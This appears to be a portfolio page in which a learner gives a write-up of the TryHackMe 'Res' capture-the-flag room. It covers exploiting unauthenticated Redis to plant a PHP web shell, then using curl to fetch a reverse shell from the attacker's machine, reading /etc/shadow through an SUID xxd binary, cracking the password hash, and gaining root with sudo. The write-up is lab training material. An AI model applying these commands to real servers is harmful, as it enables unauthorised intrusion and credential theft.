@@ -1,0 +1,178 @@
+<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<title>Res Writeup | Jonathan Vargas</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="index.html" class="logo">Jonathan Vargas</a>
+					</header>
+
+				<!-- Nav -->
+					<nav id="nav">
+						<ul class="links">
+							<li><a href="index.html">Skills Overview</a></li>
+							<li><a href="#">Security Methodologies</a></li>
+							<li><a href="#">SQL Reporting</a></li>
+							<li><a href="#">CTF Write ups</a></li>
+						</ul>
+						<ul class="icons">
+							<li><a href="https://www.instagram.com/jonathan.swing/" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
+							<li><a href="mailto:11jonathanvargas11@gmail.com?" class="icon solid fa-envelope"><span class="label">Email</span></a></li>
+							<li><a href="https://www.hackthebox.eu/home/users/profile/355309" class="icon solid fa-cube"><span class="label">HackTheBox</span></a></li>
+							<li><a href="https://github.com/vargasportfolio/" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<span class="date">October 4, 2020</span>
+									<h1>Res - Try Hack Me Writeup
+									</h1>
+								</header>
+
+								<p><a href='https://tryhackme.com/room/res'>Res</a> is a <a href='https://tryhackme.com/'>Try Hack Me</a> room serving as a surface level introduction to pentesting the <a href="https://redis.io/">Redis database management system</a>. Redis is a free, open-sourced, DBMS that provides data storage for processes, applications, and servers with an in-memory data structure. In this writeup, we will be exploring how to pentest a remote Redis instance with unauthenticated login enabled: the cause of server exploitation.</p>
+
+                <br><br>
+                <h2>Service Enumeration</h2>
+                <p>I am conducting the following port scans with <a href='https://github.com/21y4d/nmapAutomator'>nmapAutomator</a>, a highly-recommended shell script that performs basic and in-depth nmap port scans automatically. You can clone the git repo and run it with <b>./nmapAutomator.sh [IP] All</b> and leave the script running in the background while you manually enumerate services more in-depth.</p>
+                <p>My full nmapAutomator port scan returned open ports 80 and 6379.</p>
+
+                <br><br>
+                <h2>80 : HTTP</h2>
+                <p>Apache httpd 2.4.18 ((Ubuntu))</p>
+                <p>Landing page was the default Apache Ubtunu site page. When reporting this in an actual pentest writeup, it would be categorized as an information disclosure vulnerability due to the fact that it lets the user know where the website is running on the local machine. This may come in handy later.</p>
+                <figure><span class="image fit"><img src="/home/jonathan/Pictures/Screenshot_20201003_113001.png" referrerpolicy="no-referrer" alt="Screenshot_20201003_113001"></span></figure>
+
+                <br><br>
+                <h2>6379 : Redist</h2>
+                <p>Redis key-value store 6.0.7</p>
+                <p>The inital action I took was searching for any known CVEs that Redis 6.0.7 may have available. Running <b>searchsploit redis 6.0.7</b> did not return any results.</p>
+                <p>I was unsure of how to begin enumerating this service further, so I looked up &quot;how to pentest redist&quot; and came across <a href='https://book.hacktricks.xyz/pentesting/6379-pentesting-redis'>this extremely helpful article</a> that details several methods for exploiting common misconfigurations.</p>
+                <p>I was able to connect to the cli interface using <b>redis-cli -h [IP]</b>. Unauthenticated login was enabled for some reason, so I have full access to the configuration and some basic commands.</p>
+                <p><a href='https://lzone.de/cheat-sheet/Redis'>This cheatsheet</a> of redis cli commands was used for enumeration. After discovering I could view databases with the command below, I realized that there were no readable keys I had access to at this point.</p>
+                <pre><code>KEYS *
+SELECT 1
+KEYS *</code></pre>
+                <p>Using the <b>INFO</b> command allowed me to view some information about the Redis instance, and a few lines stood out to me in particular.</p>
+                <figure><span class="image fit"><img src="/home/jonathan/Pictures/Screenshot_20201003_162030.png" alt="Screenshot_20201003_162030" style="zoom: 67%;" /></span></figure>
+                <p>Redis was executed from the directory, <strong>/home/vianka/redis-stable/src/redis-server</strong>, proving that a user named <strong>vianka</strong> exists on the system.</p>
+                <p>Furthermore, we can view active server configurations by running <b>CONFIG GET *</b> from the Redis command line interface. The directory setting also appears at line 251 in the form of:</p>
+                <pre><code>251) &quot;dir&quot;
+252) &quot;/&quot;</code></pre>
+                <p>Using the hacktricks.xyz article from earlier, we can see how this may be leveraged into giving us a reverse shell. The next section will cover how we gained a foothold into the system.</p>
+                <p>&nbsp;</p>
+                <h2>Foothold</h2>
+                <h2>Writable /var/www/html Directory</h2>
+                <p><a href='https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce'>This specific section</a> of a Redis pentesting article details how we can prove if we have the ability to write to the home html directory. Doing so would allow us to launch a PHP script from our web browser that gives us remote command execution. However, we end up having to make some adjustments to the original instructions due to the fact that there are some limitations with the type of content we can write using the Redis command line interface.</p>
+                <ol start='' >
+                <li><p>Connect to redis DB with redis-cli.</p>
+                <p><code>redis-cli -h [IP]</code></p>
+                </li>
+                <li><p>Since we are connected anomyously and can alter redis configrations, run <code>config set dir /var/www/html</code>. The directory we use in this step was found from the landing page at port 80.</p>
+                </li>
+                <li><p><code>config set dbfilename redis.php</code> creates a new file in /var/ww/html named redis.php that we have write access to.</p>
+                </li>
+                <li><p>Write to the new <strong>redis.php</strong> file with <code>set test &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</code></p>
+                <p>Make sure you run the <code>save</code> command within redis-cli to write your changes to the redis.php file. </p>
+                </li>
+
+                </ol>
+                <p>I had mentioned previously that we made some slight adjustments to the original instructions included in the hacktricks article. The original instructions detailed how we can make redis.php call the phpinfo() function, which would allow for even further information disclosure on the remote system. Since this is not our goal at the moment, we will instead replace it with a very primitive web shell.</p>
+                <p>If we navigate to <a href='http://MACHINE_IP/redis.php' target='_blank' class='url'>http://MACHINE_IP/redis.php</a>, we can execute commands remotely under the www-data user with a non-interactive shell. Executing cd /home/vianka ; cat user.txt shows us the user.txt file. The link below is an example of this command being executed:</p>
+                <p><code>http://[MACHINE IP]/redis.php?cmd=cd /home/vianka ;cat user.txt</code></p>
+                <p>At this point, we have the tools necessary to spawn a reverse shell.</p>
+
+
+                <br><br>
+                <h3><strong>Upgrading to an interactive reverse shell</strong></h3>
+                <p>Using the above method of getting RCE with a tiny non-interactive PHP web shell, we can curl an interactive reverse shell onto the home website directory.</p>
+                <p>I will be using the <a href='http://pentestmonkey.net/tools/web-shells/php-reverse-shell'>PenTest Monkey reverse shell</a>. If you are using Kali Linux or Parrot Security, this can be found in <strong>/usr/share/webshells/php/php-reverse-shell.php</strong>, or run <code>locate php-reverse-shell.php</code> on your local machine if it isn&#39;t in the default directory.</p>
+                <ol start='' >
+                <li><p>Copy the php-reverse-shell php file to your current working directory. Be sure to open it with a text editor and input your own tun0 IP and port number. </p>
+                <figure><span class="image fit"><img src="/home/jonathan/Pictures/Screenshot_20201003_164632.png" referrerpolicy="no-referrer" alt="Screenshot_20201003_164632"></span></figure>
+                </li>
+                <li><p>Start up a simple HTTP server on port 80 using:</p>
+                <pre><code class='language-shell' lang='shell'>python -m SimpleHTTPServer 80
+                </code></pre>
+                </li>
+                <li><p>Start a netcat listener on the port you entered in your php-reverse-shell file. The screenshot above states port 4444.</p>
+                <pre><code>nc -nvlp 4444
+                </code></pre>
+                </li>
+                <li><p>In your web browser, run curl to download your php-reverse-shell.php file to the current working directory.</p>
+                <p><code>http://MACHINE_IP/redis.php?cmd=curl 10.13.3.178/php-reverse-shell.php &gt; shell.php</code> </p>
+                </li>
+                <li><p>With a netcat listener running, navigate to <a href='http://MACHINE_IP/shell.php' target='_blank' class='url'>http://MACHINE_IP/shell.php</a>. This will result in your netcat listener catching a reverse shell. </p>
+                </li>
+                <li><p>In your netcat reverse shell, run <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> to make your shell interactive.</p>
+                </li>
+
+                </ol>
+                <p>We now have a reverse shell running on our netcat listener.</p>
+
+                <br><br>
+                <h2>Getting Vianka&#39;s Password</h2>
+                <p><a href='https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS'>Linpeas</a> automates the checking for obvious or basic privilege escalation vectors. We can download Linpeas to the remote machine&#39;s /tmp directory using steps 2 and 4 from the previous section.</p>
+                <p>After running Linpeas, I found that we can run the SUID binary, <strong>/usr/bin/xxd</strong>. This article <a href='https://gtfobins.github.io/gtfobins/xxd/#suid'>here</a> states that we can use xxd to view protected files. Here is how we can leverage this into finding Vianka&#39;s password.</p>
+                <ol start='' >
+                <li><p>View the <strong>/etc/shadow</strong> file with Vianka&#39;s password hash.</p>
+                <p>Save Vianka&#39;s hash into a seperate file on your local machine.</p>
+                </li>
+
+                </ol>
+                <pre><code>vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:1000:1000:Res,,,:/home/vianka:/bin/bash
+                </code></pre>
+                <ol start='2' >
+                <li>With the hash stored on your local machine, use <strong>John the Ripper</strong> to brute force it using the <strong>rockyou</strong> wordlist.</li>
+
+                </ol>
+                <pre><code class='language-shell' lang='shell'>john vianka_hash --wordlist=/usr/share/wordlists/rockyou.txt
+                </code></pre>
+                <ol start='3' >
+                <li>In a few seconds, we will have received a match for the password hash. Now we can switch into Vianka&#39;s user with the command <code>su vianka</code> and enter her cracked password.</li>
+
+                </ol>
+                <p>&nbsp;</p>
+                <h2>Privilege Escalation</h2>
+                <p>With user Vianka, we can run the <code>sudo -l</code> command to view what binaries we can run using sudo.</p>
+                <figure><span class="image fit"><img src="/home/jonathan/Pictures/Screenshot_20201003_140824.png" referrerpolicy="no-referrer" alt="Screenshot_20201003_140824"></span></figure>
+                <p>The last two lines state that this user can run all commands as sudo with a password, meaning we can run <code>sudo su</code> to gain root privileges. The root flag is now viewable at /root/root.txt.</p>
+
+						</section>
+
+					</div>
+
+				<!-- Footer -->
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>Jonathan Vargas</li><li>Cybersec Portfolio</li></ul>
+					</div>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
